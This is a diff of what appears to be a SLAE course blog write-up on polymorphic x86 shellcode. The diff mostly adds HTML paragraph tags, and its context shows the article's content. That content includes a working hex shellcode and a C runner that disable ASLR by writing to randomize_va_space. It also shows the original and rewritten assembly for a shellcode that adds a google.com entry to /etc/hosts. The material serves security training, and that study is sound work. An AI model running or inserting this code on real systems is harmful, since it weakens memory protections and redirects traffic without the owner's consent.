@@ -342,7 +342,7 @@ sys_write(fd,"0;",1);
 
 
 <p style="text-align:justify;">
-The <b>mov ebx, eax</b> instruction assigns the value of file descriptor existing in <b>eax</b> register into the <b>ebx</b> register. Also, checking at the [Linux Syscall Reference](https://syscalls.kernelgrok.com/), the <b>ebx</b> register consists the first argument of the <b>write()</b> system call. Afterwards, the instruction <b>push ebx</b> pushes the file descriptor into the stack. The second argument of the <b>write()&nbsp; <b>system call referenced by the <b>ecx</b> register consists the buffer that contains the value to write inside the file. Also, the third argument referenced by the <b>edx</b> register consists the size of the buffer where in this case is one(1) byte. The instruction <b>mov cx, 0x3b30</b> represents the second argument meaning that the value <b>0;</b> will be inserted into the <b>cx</b> register containing the size of the buffer. Furthermore, the <b>0x3a30</b> hex original value altered into <b>0x3b30</b> changing " <b>:</b>" to " <b>;</b>" which does not negatively affect the execution of the program as it is not interpreted in the execution. Also, the 16bit <b>cx</b> &nbsp;register has been chosen instead of <b>ecx</b> in order to avoid producing any null bytes. As seen at the instructions above, the buffer that contains the <b>0</b> value indicating the non randomisation action of the system memory. Additionally, the <b>';'</b> value is irrelevant because the size of the buffer is only one(1) byte long, thus the <b>0</b> value will only be taken as valid. After moving the chars <b>"0;"</b> inside the second argument of the <b>write()</b> function, the instruction <b>mov ecx, esp</b> will be provided in order to align the stack pointer at the beginning of the stack. As mentioned before, the final argument contains the value of the size of the buffer which must be <b>1</b> , so the altered instructions to achieve this change, first must zero out the lower 16bits from <b>edx</b> register. To achieve this, the instruction <b>shr edx,16</b> will be used which shifts the <b>edx</b> lower 16bits by sixteen positions to the right, thus zeroing out the <b>edx</b> register. Then, the <b>edx</b> register will be increased by one in order to provide the size of the buffer to the <b>write()</b> system call. Following, a common way to call the <b>write()&nbsp;**system call is by using <b>mov al, 0x4</b> instruction which assigns the <b>0x4</b> immediate value to the <b>al</b> lower byte register. Then the instruction <b>int 0x80</b> is called to execute the <b>write()&nbsp; system call.
+The <b>mov ebx, eax</b> instruction assigns the value of file descriptor existing in <b>eax</b> register into the <b>ebx</b> register. Also, checking at the [Linux Syscall Reference](https://syscalls.kernelgrok.com/), the <b>ebx</b> register consists the first argument of the <b>write()</b> system call. Afterwards, the instruction <b>push ebx</b> pushes the file descriptor into the stack. The second argument of the <b>write()</b>system call referenced by the <b>ecx</b> register consists the buffer that contains the value to write inside the file. Also, the third argument referenced by the <b>edx</b> register consists the size of the buffer where in this case is one(1) byte. The instruction <b>mov cx, 0x3b30</b> represents the second argument meaning that the value <b>0;</b> will be inserted into the <b>cx</b> register containing the size of the buffer. Furthermore, the <b>0x3a30</b> hex original value altered into <b>0x3b30</b> changing " <b>:</b>" to " <b>;</b>" which does not negatively affect the execution of the program as it is not interpreted in the execution. Also, the 16bit <b>cx</b> &nbsp;register has been chosen instead of <b>ecx</b> in order to avoid producing any null bytes. As seen at the instructions above, the buffer that contains the <b>0</b> value indicating the non randomisation action of the system memory. Additionally, the <b>';'</b> value is irrelevant because the size of the buffer is only one(1) byte long, thus the <b>0</b> value will only be taken as valid. After moving the chars <b>"0;"</b> inside the second argument of the <b>write()</b> function, the instruction <b>mov ecx, esp</b> will be provided in order to align the stack pointer at the beginning of the stack. As mentioned before, the final argument contains the value of the size of the buffer which must be <b>1</b> , so the altered instructions to achieve this change, first must zero out the lower 16bits from <b>edx</b> register. To achieve this, the instruction <b>shr edx,16</b> will be used which shifts the <b>edx</b> lower 16bits by sixteen positions to the right, thus zeroing out the <b>edx</b> register. Then, the <b>edx</b> register will be increased by one in order to provide the size of the buffer to the <b>write()</b> system call. Following, a common way to call the <b>write()&nbsp;**system call is by using <b>mov al, 0x4</b> instruction which assigns the <b>0x4</b> immediate value to the <b>al</b> lower byte register. Then the instruction <b>int 0x80</b> is called to execute the <b>write()&nbsp; system call.
 </p>
 
 
@@ -408,8 +408,9 @@ _start:
 </pre>
 
 
-
+<p style="text-align:justify;">
 Now that the writing of the polymorphic _shellcode_ version finished, a test will run in order to check if it works. Following, checking about null bytes using **objdump** as shown below
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d polyaslr -M intel
 
@@ -460,13 +461,17 @@ Disassembly of section .text:
 
 </pre>
 
+<p style="text-align:justify;">
 From the output above it seems that there are no null bytes around, so using **objdump** the production of the _shellcode_ can be done as follows
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./polyaslr|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xdb\xf7\xe3\x89\x44\x24\xfc\xc7\x44\x24\xf8\x70\x61\x63\x65\xc7\x44\x24\xf4\x76\x61\x5f\x73\xc7\x44\x24\xf0\x69\x7a\x65\x5f\xc7\x44\x24\xec\x6e\x64\x6f\x6d\xc7\x44\x24\xe8\x6c\x2f\x72\x61\xc7\x44\x24\xe4\x65\x72\x6e\x65\xc7\x44\x24\xe0\x79\x73\x2f\x6b\xc7\x44\x24\xdc\x6f\x63\x2f\x73\xc7\x44\x24\xd8\x2f\x2f\x70\x72\x83\xec\x28\x89\xe3\x66\xb9\x01\x03\x66\xba\xa1\x02\x66\x83\xc2\x1b\xb0\x05\xcd\x80\x89\xc3\x53\x66\xb9\x30\x3b\x66\x51\x89\xe1\xc1\xea\x10\x42\xb0\x04\xcd\x80\xb0\x01\xcd\x80"
 </pre>
 
+<p style="text-align:justify;">
 Afterwards the produced _shellcode_ will be added into a C program named **sh.c** in order to deliver the execution of the polimorphic shellcode.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 #include 
@@ -498,7 +503,9 @@ ret();
 }
 </pre>
 
+<p style="text-align:justify;">
 Compiling and running the above program will change the value inside the **/proc/sys/kernel/randomize\_va\_space** from **two(2)** to **zero(0)**.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># cat /proc/sys/kernel/randomize\_va\_space
 2
@@ -520,9 +527,11 @@ polymorphic version length : 124
 
 ## **Add map in /etc/hosts file**  
 
+<p style="text-align:justify;">
 The third shellcode to analyse adds a new entry in hosts file pointing google.com to 127.1.1.1 and can be found at [shell-storm.org](http://shell-storm.org/) Also, the original shellcode can be found at this [link](http://shell-storm.org/shellcode/files/shellcode-893.php). In general, Linux systems contain a hosts file used to translate hostnames to IP addresses. The hosts file is a simple text file located in the etc folder on Linux and Mac OS ( **/etc/hosts** ).
 
 The following output shows the assembly code from the original shellcode.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 global _start
@@ -566,7 +575,9 @@ _load_data:
  google db "127.1.1.1 google.com"
 </pre>
 
+<p style="text-align:justify;">
 Furthermore, the instructions above can be changed in order to perform polymorphism while altering the coding format without changing the functionality of the program. First, the instructions that represent the **open()** system call will be changed as follows
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions 
@@ -607,11 +618,13 @@ xor eax, eax
 jmp short _ldata ;jmp-call-pop technique to load the map
 </pre>
 
+<p style="text-align:justify;">
 The above instructions have been altered in order to achieve polymorphism. The technique **jmp-pop-call** will still remains the same with changes only in label names. Also, the **mul ecx** replaced with , **cdq** and **xor eax, eax ,** zeroing out the **eax** and **edx** registers accordingly. Additionally, the **push** instruction has been altered using **mov** instruction and the file permissions value **0x401** in hex has been splitted into two values , **0x3b1** and **0x50** instead of one, adding them together using the **add** instruction at the 8bits register **cx**. The **xchg** instruction has been changed to **mov** instruction as the **ebx** will be assigned with the value **0x3** which represents the hosts file descriptor returned from the **open()** system call. The **xchg** used from _shellcode_ writer to reduce the _shellcode_ length as it needs two bytes, against the three bytes that **mov** needs. Also , the _shellcode_ writer uses **push** and **pop** to load the **0x4** immediate value into **eax** register indicating the **write()** system call. The alteration here is that the **push** and **pop** replaced with **mov** and also the location of the instruction moved after the **jmp short** instruction and before the **int 0x80** instruction.
 
 Furthermore, the label **\_load\_data** will be changed with **\_ldata** at **jmp short** instruction. Also, as already mentioned the **mov** instruction above is doing the same thing as the **push** instruction, and that because the **push** instruction is decrementing the stack pointer by the operand size, then moves the operand to the location pointed by the stack pointer. Furthermore, the **sub ebx, 0x10** instruction used to make room for four local variables in the stack to place the string **/etc///hosts** and the **mov ebx, esp** instruction used for stack alignment setting the pointer at the top of the stack.
 
 To continue further the write system call instructions will be altered as follows
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
@@ -632,9 +645,12 @@ mov al, 0x4
 int 0x80
 </pre>
 
+<p style="text-align:justify;">
+
 The main alteration here is the **pop** and **push** instructions which altered into **mov.** Also in order to avoid null bytes the **edx** register changed into the lower byte register **dl**. Additionally the **\_write** label has been changed into **write\_data**. Following, the **0x15** hex value which represents the length of the message along with the additional carriage return character has been splitted into two values **0x12** and **0x3** instead of one value, then adding them together using the **add** instruction.
 
 The next instructions to be altered are representing the **close** system call.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
@@ -862,7 +878,7 @@ ff02::2 ip6-allrouters
 127.1.1.1 google.com
 </pre>
 
-As&nbsp; seen previously in this article, the length of the new _shellcode_ must be checked in order to align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original _shellcode_. The calculation below shows that the exercise rule is followed. point
+As&nbsp; seen previously in this article, the length of the new _shellcode_ must be checked in order to align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original shellcode. The calculation below shows that the exercise rule is followed. point
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 original shelcode length : 77
